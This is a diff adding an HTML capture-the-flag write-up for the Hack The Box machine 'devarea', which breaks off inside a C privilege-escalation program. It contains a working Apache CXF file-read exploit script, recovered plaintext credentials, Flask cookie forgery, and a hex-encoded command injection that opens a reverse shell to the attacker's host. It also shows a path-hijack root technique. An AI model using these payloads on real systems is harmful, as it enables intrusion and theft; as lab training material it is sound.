@@ -1,0 +1,1067 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>devarea | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">devarea</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ==================== ENGLISH ==================== -->
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The attack began with an Apache CXF 3.2.14 SOAP service exposed on port 8080. By exploiting
+                        <strong>CVE-2022-46364</strong>, a Server-Side Request Forgery vulnerability in CXF's XOP
+                        include handling, arbitrary files from the target filesystem could be read by embedding
+                        <code>file:///</code> URIs inside MTOM multipart SOAP requests. This allowed reading
+                        <code>/proc/self/environ</code>, <code>/proc/&lt;pid&gt;/cmdline</code>, and systemd unit
+                        files, which together revealed credentials for a Hoverfly instance running on port 8888.</p>
+
+                    <p>Hoverfly version 1.11.3 is vulnerable to an authenticated RCE (GHSA-r4h8-hfp2-ggmf). Using the
+                        recovered credentials, a reverse shell was obtained as user <code>dev_ryan</code>. With a
+                        foothold on the machine, a Flask secret key was found in <code>/etc/syswatch.env</code>,
+                        allowing the forgery of a valid session cookie to access an internal SysWatch web interface
+                        running on <code>localhost:7777</code>.</p>
+
+                    <p>That interface contained a service-status endpoint vulnerable to command injection, protected by
+                        a regex that blocked uppercase characters — preventing direct use of <code>base64</code>. The
+                        restriction was bypassed using <code>xxd</code> to hex-encode a reverse shell payload, gaining
+                        access as the <code>syswatch</code> user.</p>
+
+                    <p>Privilege escalation to root exploited a path hijacking opportunity: <code>/usr/bin/bash</code>
+                        was world-writable, and a <code>sudo</code>-allowed script called <code>bash</code> without an
+                        absolute path. By replacing <code>/usr/bin/bash</code> with a compiled C binary that sets the
+                        SUID bit on <code>/bin/bash</code> before exec'ing the real shell, triggering the script via
+                        <code>sudo</code> resulted in a SUID bash, granting a root shell.</p>
+
+                    <p><strong>Techniques/Exploits:</strong> Apache CXF CVE-2022-46364 SSRF / arbitrary file read,
+                        Hoverfly authenticated RCE (GHSA-r4h8-hfp2-ggmf), Flask session cookie forgery with
+                        <code>flask-unsign</code>, command injection with <code>xxd</code> hex bypass, bash path
+                        hijacking privilege escalation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and running services:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">21</span>/tcp   open  ftp     <span style="color:#98c379;">vsftpd 3.0.5</span>
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x 2 ftp ftp 4096 Sep 22 2025 pub
+<span style="color:#e06c75;">22</span>/tcp   open  ssh     <span style="color:#98c379;">OpenSSH 9.6p1 Ubuntu 3ubuntu13.15</span>
+<span style="color:#e06c75;">80</span>/tcp   open  http    <span style="color:#98c379;">Apache httpd 2.4.58</span>
+|_http-title: Did not follow redirect to http://devarea.htb/
+<span style="color:#e06c75;">8080</span>/tcp open  http    <span style="color:#98c379;">Jetty 9.4.27.v20200227</span>
+|_http-title: Error 404 Not Found
+<span style="color:#e06c75;">8500</span>/tcp open  http    <span style="color:#98c379;">Golang net/http server</span>
+<span style="color:#e06c75;">8888</span>/tcp open  http    <span style="color:#98c379;">Golang net/http server</span>
+|_http-title: Hoverfly Dashboard</code></pre>
+
+                <p>Several interesting services are present. Port 80 redirects to <code>devarea.htb</code> (added to
+                    <code>/etc/hosts</code>), which turns out to be a developer recruitment landing page with nothing
+                    obviously exploitable. The more interesting services are:</p>
+                <ul>
+                    <li>Port <strong>8080</strong>: Eclipse Jetty 9.4.27 — old version, potentially vulnerable</li>
+                    <li>Port <strong>8500</strong>: An HTTP proxy</li>
+                    <li>Port <strong>8888</strong>: <a href="https://github.com/SpectoLabs/Hoverfly">Hoverfly</a>
+                        dashboard — an API simulation service</li>
+                    <li>Port <strong>21</strong>: FTP with anonymous login allowed</li>
+                </ul>
+
+                <h3>Proxy on Port 8500</h3>
+                <p>Port 8500 appears to be an HTTP proxy. Attempting to use it triggers a 407 authentication challenge:</p>
+
+                <pre><code class="language-bash">curl -x http://devarea.htb:8500 http://10.10.14.129
+<span style="color:#e06c75;">407 Proxy authentication required</span></code></pre>
+
+                <p>The <code>Proxy-Authenticate: Basic realm=hoverfly</code> response header reveals it's tied to the
+                    Hoverfly service. If credentials for Hoverfly are found, this proxy could serve as a useful
+                    SSRF pivot.</p>
+
+                <p><img src="./media/image4.png" alt="HTTP 407 proxy authentication required response from port 8500 showing the Hoverfly realm" /></p>
+
+                <h3>Jetty on Port 8080</h3>
+                <p>The Jetty server returns a 404 on the root, but the version is notable: <strong>9.4.27.v20200227</strong>. Given that date, it's likely outdated.</p>
+
+                <p><img src="./media/image6.png" alt="Eclipse Jetty 9.4.27 404 error page on port 8080" /></p>
+
+                <h2>FTP Enumeration — employee-service.jar</h2>
+                <p>Logging into the FTP server as anonymous, a file is available inside the <code>pub</code> directory:</p>
+
+                <pre><code class="language-plaintext">-rw-r--r-- 1 ftp ftp 6445030 Sep 22 2025 employee-service.jar</code></pre>
+
+                <p>Extracting it with <code>unzip</code> reveals compiled Java classes under the package
+                    <code>htb/devarea</code>. Using the VSCode "Extension Pack for Java" to decompile them, four classes
+                    are visible:</p>
+
+                <pre><code class="language-java"><span style="color:#c678dd;">// EmployeeServiceImpl.java</span>
+<span style="color:#c678dd;">package</span> <span style="color:#e5c07b;">htb.devarea</span>;
+
+<span style="color:#c678dd;">public class</span> <span style="color:#e5c07b;">EmployeeServiceImpl</span> <span style="color:#c678dd;">implements</span> <span style="color:#e5c07b;">EmployeeService</span> {
+    <span style="color:#c678dd;">public</span> <span style="color:#e5c07b;">String</span> <span style="color:#61afef;">submitReport</span>(<span style="color:#e5c07b;">Report</span> report) {
+        <span style="color:#e5c07b;">String</span> greeting = report.<span style="color:#61afef;">isConfidential</span>()
+            ? <span style="color:#98c379;">"Report marked confidential. Thank you, "</span> + report.<span style="color:#61afef;">getEmployeeName</span>()
+            : <span style="color:#98c379;">"Report received from "</span> + report.<span style="color:#61afef;">getEmployeeName</span>();
+        <span style="color:#c678dd;">return</span> greeting + <span style="color:#98c379;">". Department: "</span> + report.<span style="color:#61afef;">getDepartment</span>()
+            + <span style="color:#98c379;">". Content: "</span> + report.<span style="color:#61afef;">getContent</span>();
+    }
+}</code></pre>
+
+                <pre><code class="language-java"><span style="color:#c678dd;">// Report.java</span>
+<span style="color:#c678dd;">package</span> <span style="color:#e5c07b;">htb.devarea</span>;
+
+<span style="color:#c678dd;">public class</span> <span style="color:#e5c07b;">Report</span> {
+    <span style="color:#c678dd;">private</span> <span style="color:#e5c07b;">String</span> employeeName;
+    <span style="color:#c678dd;">private</span> <span style="color:#e5c07b;">String</span> department;
+    <span style="color:#c678dd;">private</span> <span style="color:#e5c07b;">String</span> content;
+    <span style="color:#c678dd;">private boolean</span> confidential;
+    <span style="color:#c678dd;">// getters, setters and toString omitted for brevity</span>
+}</code></pre>
+
+                <pre><code class="language-java"><span style="color:#c678dd;">// EmployeeService.java</span>
+<span style="color:#c678dd;">package</span> <span style="color:#e5c07b;">htb.devarea</span>;
+<span style="color:#c678dd;">import</span> javax.jws.WebService;
+
+<span style="color:#56b6c2;">@WebService</span>(name = <span style="color:#98c379;">"EmployeeService"</span>, targetNamespace = <span style="color:#98c379;">"http://devarea.htb/"</span>)
+<span style="color:#c678dd;">public interface</span> <span style="color:#e5c07b;">EmployeeService</span> {
+    <span style="color:#e5c07b;">String</span> <span style="color:#61afef;">submitReport</span>(<span style="color:#e5c07b;">Report</span> var1);
+}</code></pre>
+
+                <pre><code class="language-java"><span style="color:#c678dd;">// ServerStarter.java</span>
+<span style="color:#c678dd;">package</span> <span style="color:#e5c07b;">htb.devarea</span>;
+<span style="color:#c678dd;">import</span> org.apache.cxf.jaxws.JaxWsServerFactoryBean;
+
+<span style="color:#c678dd;">public class</span> <span style="color:#e5c07b;">ServerStarter</span> {
+    <span style="color:#c678dd;">public static void</span> <span style="color:#61afef;">main</span>(<span style="color:#e5c07b;">String</span>[] args) {
+        <span style="color:#e5c07b;">JaxWsServerFactoryBean</span> factory = <span style="color:#c678dd;">new</span> <span style="color:#e5c07b;">JaxWsServerFactoryBean</span>();
+        factory.<span style="color:#61afef;">setServiceClass</span>(EmployeeService.class);
+        factory.<span style="color:#61afef;">setServiceBean</span>(<span style="color:#c678dd;">new</span> <span style="color:#e5c07b;">EmployeeServiceImpl</span>());
+        factory.<span style="color:#61afef;">setAddress</span>(<span style="color:#98c379;">"http://0.0.0.0:8080/employeeservice"</span>);
+        factory.<span style="color:#61afef;">create</span>();
+    }
+}</code></pre>
+
+                <p>This confirms there's a SOAP web service running at
+                    <code>http://devarea.htb:8080/employeeservice</code>, built using <strong>Apache CXF</strong>. The
+                    WSDL is accessible at
+                    <a href="http://devarea.htb:8080/employeeservice?wsdl">http://devarea.htb:8080/employeeservice?wsdl</a>.
+                    A test request confirms the service works as expected:</p>
+
+                <pre><code class="language-bash">curl -s -X POST http://devarea.htb:8080/employeeservice \
+  -H <span style="color:#98c379;">"Content-Type: text/xml;charset=UTF-8"</span> \
+  -H <span style="color:#98c379;">"SOAPAction: ''"</span> \
+  -d <span style="color:#98c379;">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+  xmlns:tns="http://devarea.htb/"&gt;
+  &lt;soapenv:Body&gt;
+    &lt;tns:submitReport&gt;
+      &lt;arg0&gt;
+        &lt;confidential&gt;false&lt;/confidential&gt;
+        &lt;content&gt;test&lt;/content&gt;
+        &lt;department&gt;IT&lt;/department&gt;
+        &lt;employeeName&gt;alice&lt;/employeeName&gt;
+      &lt;/arg0&gt;
+    &lt;/tns:submitReport&gt;
+  &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;'</span></code></pre>
+
+                <pre><code class="language-xml"><span style="color:#e06c75;">&lt;soap:Envelope</span> <span style="color:#d19a66;">xmlns:soap</span>=<span style="color:#98c379;">"http://schemas.xmlsoap.org/soap/envelope/"</span><span style="color:#e06c75;">&gt;</span>
+  <span style="color:#e06c75;">&lt;soap:Body&gt;</span>
+    <span style="color:#e06c75;">&lt;ns2:submitReportResponse</span> <span style="color:#d19a66;">xmlns:ns2</span>=<span style="color:#98c379;">"http://devarea.htb/"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;return&gt;</span>Report received from alice. Department: IT. Content: test<span style="color:#e06c75;">&lt;/return&gt;</span>
+    <span style="color:#e06c75;">&lt;/ns2:submitReportResponse&gt;</span>
+  <span style="color:#e06c75;">&lt;/soap:Body&gt;</span>
+<span style="color:#e06c75;">&lt;/soap:Envelope&gt;</span></code></pre>
+
+                <p>Initial attack attempts (XXE, SSTI, Log4Shell payloads) don't produce results. The next step is to
+                    check the dependency versions in <code>pom.xml</code> inside the JAR:</p>
+
+                <pre><code class="language-xml"><span style="color:#e06c75;">&lt;cxf.version&gt;</span><span style="color:#98c379;">3.2.14</span><span style="color:#e06c75;">&lt;/cxf.version&gt;</span></code></pre>
+
+                <p>Apache CXF 3.2.14 is from 2020 — quite old. Checking the vulnerability list at
+                    <a href="https://www.cvedetails.com/version/780430/Apache-CXF-3.2.14.html">CVEDetails</a> reveals
+                    several SSRF vulnerabilities applicable to this version.</p>
+
+                <h2>Apache CXF SSRF — CVE-2022-46364 (Arbitrary File Read)</h2>
+                <p>CVE-2022-46364 abuses CXF's handling of MTOM (Message Transmission Optimization Mechanism) multipart
+                    SOAP messages. By embedding an XOP <code>Include</code> element with a <code>file:///</code> URI as
+                    the <code>href</code>, the server fetches the local file and includes its base64-encoded content in
+                    the SOAP response. CVE-2024-28752 is another applicable vulnerability with a similar approach — both
+                    were tested and confirmed working against this target.</p>
+
+                <pre><code class="language-bash">curl -s -X POST http://devarea.htb:8080/employeeservice \
+  -H <span style="color:#98c379;">'Content-Type: multipart/related; type="application/xop+xml"; start="&lt;root.message@cxf.apache.org&gt;"; start-info="text/xml"'</span> \
+  -H <span style="color:#98c379;">"SOAPAction: ''"</span> \
+  -d <span style="color:#98c379;">'--MIMEBoundary
+Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
+Content-Transfer-Encoding: 8bit
+Content-ID: &lt;root.message@cxf.apache.org&gt;
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+  xmlns:tns="http://devarea.htb/"&gt;
+  &lt;soapenv:Body&gt;
+    &lt;tns:submitReport&gt;
+      &lt;arg0&gt;
+        &lt;confidential&gt;false&lt;/confidential&gt;
+        &lt;content&gt;test&lt;/content&gt;
+        &lt;department&gt;IT&lt;/department&gt;
+        &lt;employeeName&gt;
+          &lt;inc:Include href="file:///etc/hostname" xmlns:inc="http://www.w3.org/2004/08/xop/include"/&gt;
+        &lt;/employeeName&gt;
+      &lt;/arg0&gt;
+    &lt;/tns:submitReport&gt;
+  &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+--MIMEBoundary--'</span></code></pre>
+
+                <pre><code class="language-plaintext">...Report received from <span style="color:#e5c07b;">ZGV2YXJlYQo=</span>. Department: IT. Content: test...</code></pre>
+
+                <pre><code class="language-bash">echo <span style="color:#98c379;">"ZGV2YXJlYQo="</span> | base64 -d
+<span style="color:#98c379;">devarea</span></code></pre>
+
+                <p>File read confirmed. To make exploitation easier, a wrapper bash script automates the request and
+                    decodes the base64 response:</p>
+
+                <pre><code class="language-bash"><span style="color:#e06c75;">#!/bin/bash</span>
+<span style="color:#d19a66;">FILE</span>=<span style="color:#98c379;">${1:-/etc/hostname}</span>
+<span style="color:#d19a66;">TARGET</span>=<span style="color:#98c379;">"http://devarea.htb:8080/employeeservice"</span>
+
+<span style="color:#d19a66;">RESPONSE</span>=$(curl -s -X POST <span style="color:#98c379;">"$TARGET"</span> \
+  -H <span style="color:#98c379;">'Content-Type: multipart/related; type="application/xop+xml"; start="&lt;root.message@cxf.apache.org&gt;"; start-info="text/xml"'</span> \
+  -H <span style="color:#98c379;">"SOAPAction: ''"</span> \
+  -d <span style="color:#98c379;">"--MIMEBoundary
+Content-Type: application/xop+xml; charset=UTF-8; type=\"text/xml\"
+Content-Transfer-Encoding: 8bit
+Content-ID: &lt;root.message@cxf.apache.org&gt;
+
+&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;
+&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
+  xmlns:tns=\"http://devarea.htb/\"&gt;
+  &lt;soapenv:Body&gt;
+    &lt;tns:submitReport&gt;
+      &lt;arg0&gt;
+        &lt;confidential&gt;false&lt;/confidential&gt;
+        &lt;content&gt;test&lt;/content&gt;
+        &lt;department&gt;IT&lt;/department&gt;
+        &lt;employeeName&gt;
+          &lt;inc:Include href=\"file://${FILE}\" xmlns:inc=\"http://www.w3.org/2004/08/xop/include\"/&gt;
+        &lt;/employeeName&gt;
+      &lt;/arg0&gt;
+    &lt;/tns:submitReport&gt;
+  &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+--MIMEBoundary--"</span>)
+
+<span style="color:#d19a66;">B64</span>=$(echo <span style="color:#98c379;">"$RESPONSE"</span> | grep -oP <span style="color:#98c379;">'(?&lt;=from )[A-Za-z0-9+/=]+(?=\.)'</span>)
+
+<span style="color:#c678dd;">if</span> [[ -z <span style="color:#98c379;">"$B64"</span> ]]; <span style="color:#c678dd;">then</span>
+  echo <span style="color:#98c379;">"[-] No base64 found. Raw response:"</span>
+  echo <span style="color:#98c379;">"$RESPONSE"</span>
+  exit 1
+<span style="color:#c678dd;">fi</span>
+
+echo <span style="color:#98c379;">"[+] Reading: $FILE"</span>
+echo <span style="color:#98c379;">"---"</span>
+echo <span style="color:#98c379;">"$B64"</span> | base64 -d</code></pre>
+
+                <p>Checking <code>/etc/passwd</code> to identify local users:</p>
+
+                <pre><code class="language-bash">./xploiter.sh /etc/passwd | grep sh
+<span style="color:#98c379;">root:x:0:0:root:/root:/bin/bash</span>
+<span style="color:#98c379;">dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash</span></code></pre>
+
+                <p>The user <code>dev_ryan</code> stands out. Reading <code>/proc/self/environ</code> reveals the
+                    process environment:</p>
+
+                <pre><code class="language-bash">./xploiter.sh /proc/self/environ
+<span style="color:#98c379;">[+] Reading: /proc/self/environ
+---
+LANG=en_US.UTF-8PATH=...USER=dev_ryanLOGNAME=dev_ryanHOME=/home/dev_ryan
+SHELL=/bin/bash...JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64</span></code></pre>
+
+                <p>The Java service is running as <code>dev_ryan</code>. Brute-forcing PIDs to read
+                    <code>/proc/&lt;pid&gt;/cmdline</code> uncovers the Hoverfly process arguments, which include
+                    credentials passed as plaintext flags:</p>
+
+                <pre><code class="language-bash">for i in $(seq 1 12000); do echo "=== PID $i ==="; ./xploiter.sh /proc/$i/cmdline; done</code></pre>
+
+                <pre><code class="language-plaintext">[+] Reading: /proc/1487/cmdline
+---
+/opt/HoverFly/hoverfly<span style="color:#e06c75;">-add</span><span style="color:#e06c75;">-username</span><span style="color:#98c379;">admin</span><span style="color:#e06c75;">-password</span><span style="color:#98c379;">O7IJ27MyyXiU</span><span style="color:#e06c75;">-listen-on-host</span>0.0.0.0</code></pre>
+
+                <p>Credentials found: <code>admin:O7IJ27MyyXiU</code>. These can also be confirmed by reading the
+                    systemd unit file directly, which presents the information even more cleanly:</p>
+
+                <pre><code class="language-bash">./xploiter.sh /etc/systemd/system/hoverfly.service</code></pre>
+
+                <pre><code class="language-ini"><span style="color:#e06c75;">[Unit]</span>
+Description=HoverFly service
+After=network.target
+
+<span style="color:#e06c75;">[Service]</span>
+<span style="color:#d19a66;">User</span>=dev_ryan
+<span style="color:#d19a66;">Group</span>=dev_ryan
+<span style="color:#d19a66;">WorkingDirectory</span>=/opt/HoverFly
+<span style="color:#d19a66;">ExecStart</span>=/opt/HoverFly/hoverfly <span style="color:#e06c75;">-add</span> <span style="color:#e06c75;">-username</span> <span style="color:#98c379;">admin</span> <span style="color:#e06c75;">-password</span> <span style="color:#98c379;">O7IJ27MyyXiU</span> <span style="color:#e06c75;">-listen-on-host</span> 0.0.0.0
+<span style="color:#d19a66;">Restart</span>=on-failure</code></pre>
+
+                <h2>Hoverfly RCE — GHSA-r4h8-hfp2-ggmf</h2>
+                <p>Accessing the Hoverfly dashboard on port 8888 with the found credentials reveals version
+                    <strong>1.11.3</strong>. The Hoverfly security advisories at
+                    <a href="https://github.com/SpectoLabs/hoverfly/security">https://github.com/SpectoLabs/hoverfly/security</a>
+                    list an authenticated RCE vulnerability affecting versions up to and including 1.11.3:
+                    <a href="https://github.com/advisories/GHSA-r4h8-hfp2-ggmf">GHSA-r4h8-hfp2-ggmf</a>.</p>
+
+                <p>Using Burp Suite to send the exploit request, RCE is confirmed — the output at the end of the
+                    response body shows <code>STDOUT:\ndev_ryan</code>:</p>
+
+                <p><img src="./media/image3.png" alt="Burp Suite request demonstrating authenticated RCE in Hoverfly 1.11.3, with STDOUT showing dev_ryan in the response" /></p>
+
+                <p>With RCE confirmed, a reverse shell payload is sent through the same endpoint, landing a shell as
+                    <code>dev_ryan</code> and allowing retrieval of the user flag.</p>
+
+                <h2>Lateral Movement — SysWatch Web Interface</h2>
+                <p>Checking <code>sudo</code> privileges for <code>dev_ryan</code>:</p>
+
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">User dev_ryan may run the following commands on devarea:
+    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart</code></pre>
+
+                <p><code>dev_ryan</code> can run <code>syswatch.sh</code> as root, but the <code>web-stop</code> and
+                    <code>web-restart</code> subcommands are explicitly denied. The available commands include
+                    <code>web-status</code>, <code>plugin</code>, <code>logs</code>, and others. Running
+                    <code>web-status</code> shows a Python web app running on port 7777:</p>
+
+                <pre><code class="language-bash">sudo /opt/syswatch/syswatch.sh web-status</code></pre>
+
+                <pre><code class="language-plaintext">● syswatch-web.service - SysWatch Web GUI
+   Active: active (running)
+   Main PID: 1462 (python)
+   CGroup: /system.slice/syswatch-web.service
+           └─1462 /opt/syswatch/venv/bin/python /opt/syswatch/syswatch_gui/app.py</code></pre>
+
+                <p>This service is listening only on localhost. To access it, the SSH public key is added to
+                    <code>~/.ssh/authorized_keys</code> and the port is forwarded:</p>
+
+                <pre><code class="language-bash">ssh -L 7777:127.0.0.1:7777 dev_ryan@devarea.htb</code></pre>
+
+                <p>The systemd unit file for this service reveals an important environment file:</p>
+
+                <pre><code class="language-bash">cat /etc/systemd/system/syswatch-web.service</code></pre>
+
+                <pre><code class="language-ini"><span style="color:#e06c75;">[Service]</span>
+<span style="color:#d19a66;">User</span>=syswatch
+<span style="color:#d19a66;">EnvironmentFile</span>=/etc/syswatch.env
+<span style="color:#d19a66;">ExecStart</span>=/opt/syswatch/venv/bin/python /opt/syswatch/syswatch_gui/app.py</code></pre>
+
+                <pre><code class="language-bash">cat /etc/syswatch.env</code></pre>
+
+                <pre><code class="language-plaintext">SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
+SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
+SYSWATCH_LOG_DIR=/opt/syswatch/logs
+SYSWATCH_DB_PATH=/opt/syswatch/syswatch_gui/syswatch.db
+SYSWATCH_PLUGIN_DIR=/opt/syswatch/plugins
+SYSWATCH_BACKUP_DIR=/opt/syswatch/backup
+SYSWATCH_VERSION=1.0.0</code></pre>
+
+                <p>The <code>SYSWATCH_ADMIN_PASSWORD</code> and credentials from a SQLite database found in a
+                    <code>syswatch-v1.zip</code> archive in <code>dev_ryan</code>'s home directory were tested against
+                    the login form at <code>localhost:7777</code> — neither works.</p>
+
+                <p>However, the <strong>Flask secret key</strong> is available. Since the source code (found in the zip
+                    archive) shows that only a valid session cookie containing a <code>user_id</code> field is needed to
+                    authenticate, a cookie can be forged using <code>flask-unsign</code>:</p>
+
+                <pre><code class="language-bash">flask-unsign --sign --cookie <span style="color:#98c379;">"{'username': 'admin', 'user_id': 1}"</span> \
+  --secret f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725</code></pre>
+
+                <pre><code class="language-plaintext">eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9pZCI6MX0.ack8Fw.l_NXlrXPNNYq8-uRyP6zYR2fueI</code></pre>
+
+                <p>Injecting this cookie in the browser grants access to the SysWatch dashboard:</p>
+
+                <p><img src="./media/image2.png" alt="SysWatch web dashboard accessible after injecting a forged Flask session cookie" /></p>
+
+                <h2>Command Injection — xxd Hex Bypass</h2>
+                <p>The most interesting endpoint in the SysWatch interface is <strong>service-status</strong>, which
+                    appears to run <code>systemctl status</code> on a user-supplied service name:</p>
+
+                <p><img src="./media/image1.png" alt="SysWatch service-status interface showing a service name input field" /></p>
+
+                <p>Reviewing the source code from the zip archive reveals the backend implementation:</p>
+
+                <pre><code class="language-python"><span style="color:#d19a66;">SAFE_SERVICE</span> = re.<span style="color:#61afef;">compile</span>(<span style="color:#98c379;">r"^[^;/\&amp;.&lt;&gt;\rA-Z]*$"</span>)
+
+<span style="color:#c678dd;">if not</span> service <span style="color:#c678dd;">or not</span> SAFE_SERVICE.<span style="color:#61afef;">match</span>(service):
+    error = <span style="color:#98c379;">"Invalid service name"</span>
+<span style="color:#c678dd;">else</span>:
+    <span style="color:#c678dd;">try</span>:
+        res = subprocess.<span style="color:#61afef;">run</span>(
+            [<span style="color:#98c379;">f"systemctl status --no-pager {service}"</span>],
+            shell=<span style="color:#e5c07b;">True</span>, capture_output=<span style="color:#e5c07b;">True</span>, text=<span style="color:#e5c07b;">True</span>, timeout=<span style="color:#d19a66;">10</span>
+        )</code></pre>
+
+                <p>The <code>service</code> parameter is passed unsanitized into a shell command. The regex blocks
+                    semicolons, slashes, ampersands, dots, angle brackets, carriage returns, and
+                    <strong>uppercase letters</strong>. The frontend adds extra client-side checks (e.g., blocking
+                    <code>$()</code>), but those are bypassable through Burp Suite — the backend has no such
+                    restriction.</p>
+
+                <p>The key constraint is that <code>base64</code> contains uppercase letters (<code>B</code>,
+                    <code>A</code>...) and is therefore blocked. The classic technique of base64-encoding a payload
+                    won't work. However, <code>xxd</code> provides an equivalent path using only lowercase hex:</p>
+
+                <pre><code class="language-bash"><span style="color:#c678dd;"># Encode a command to hex</span>
+echo -n <span style="color:#98c379;">"id"</span> | xxd -p
+<span style="color:#98c379;">6964</span>
+
+<span style="color:#c678dd;"># Decode hex back to command</span>
+echo -n <span style="color:#98c379;">"6964"</span> | xxd -p -r
+<span style="color:#98c379;">id</span></code></pre>
+
+                <p>Using this technique, the reverse shell command is hex-encoded and injected via Burp Suite:</p>
+
+                <p><img src="./media/image5.png" alt="Burp Suite request showing the xxd-based hex command injection payload in the service parameter" /></p>
+
+                <p>The full payload, URL-encoded for the POST body:</p>
+
+                <pre><code class="language-plaintext">service=$(echo%20"62617368202d63202262617368202d69203e26202f6465762f7463702f31302e31302e31342e3132392f34343320303e263122"|xxd%20-p%20-r|bash)</code></pre>
+
+                <p>This decodes and executes: <code>bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.129/443 0&gt;&amp;1"</code></p>
+
+                <p>A shell is obtained as user <code>syswatch</code>. This user has access to
+                    <code>/opt/syswatch</code> but write access is limited to <code>/opt/syswatch/logs</code> and
+                    <code>/opt/syswatch/backup</code>. There's nothing further to exploit from this user directly, so
+                    the focus shifts to privilege escalation.</p>
+
+                <h2>Privilege Escalation — Bash Path Hijacking</h2>
+                <p>Looking at <code>/opt/syswatch/syswatch.sh</code>, lines 95 and 97 call <code>bash</code> without an
+                    absolute path:</p>
+
+                <pre><code class="language-bash"><span style="color:#c678dd;">if</span> [ <span style="color:#98c379;">"$run_root"</span> -eq 1 ]; <span style="color:#c678dd;">then</span>
+    bash <span style="color:#98c379;">"$fullpath"</span> <span style="color:#98c379;">"$@"</span>
+<span style="color:#c678dd;">else</span>
+    runuser -u <span style="color:#98c379;">"$SYSWATCH_USER"</span> -- bash <span style="color:#98c379;">"$fullpath"</span> <span style="color:#98c379;">"$@"</span>
+<span style="color:#c678dd;">fi</span></code></pre>
+
+                <p>The <code>sudo</code> secure path is:</p>
+
+                <pre><code class="language-plaintext">secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</code></pre>
+
+                <p><code>/bin</code> is at the end of the path. If any earlier directory contains a writable
+                    <code>bash</code> binary, it would be resolved first when <code>sudo</code> calls the script.
+                    Checking <code>/usr/bin/bash</code>:</p>
+
+                <pre><code class="language-bash">ls -lah /usr/bin/bash
+<span style="color:#98c379;">-rwxrwxrwx 1 root root 1.4M Mar 31 2024 /usr/bin/bash</span></code></pre>
+
+                <p><code>/usr/bin/bash</code> is world-writable. Since <code>/usr/bin</code> comes before <code>/bin</code>
+                    in the secure path, any call to <code>bash</code> from within the sudo-executed script will resolve to
+                    <code>/usr/bin/bash</code> first. The plan is to replace it with a custom binary that sets the SUID
+                    bit on <code>/bin/bash</code> before handing off to the real shell.</p>
+
+                <p>Overwriting the currently running shell binary from within itself causes a "Text file busy" error.
+                    The solution is to switch to <code>sh</code> first, then kill any remaining <code>bash</code>
+                    instances:</p>
+
+                <pre><code class="language-bash">exec /bin/sh
+killall -9 bash</code></pre>
+
+                <p>The <code>-9</code> flag sends <code>SIGKILL</code>, which cannot be caught or ignored by the target
+                    process. Next, a small C program is compiled on the attacker machine. It sets the SUID bit on
+                    <code>/bin/bash</code> and then exec's a real bash copy (placed at <code>/tmp/bash_real</code>) to
+                    avoid infinite recursion:</p>
+
+                <pre><code class="language-c"><span style="color:#c678dd;">#include</span> <span style="color:#98c379;">&lt;unistd.h&gt;</span>
+<span style="color:#c678dd;">#include</span> <span style="color:#98c379;">&lt;sys/stat.h&gt;</span>
+
+<span style="color:#e5c07b;">int</span> <span style="color:#61afef;">main</span>(<span style="color:#e5c07b;">int</span> argc, <span style="color:#e5c07b;">char</span> *argv[], <span style="color:#e5c07b;">char</span> *envp[]) {
+    <span style="color:#61afef;">chmod</span>(<span style="color:#98c379;">"/bin/bash"</span>, <span style="color:#d19a66;">04755</span>);
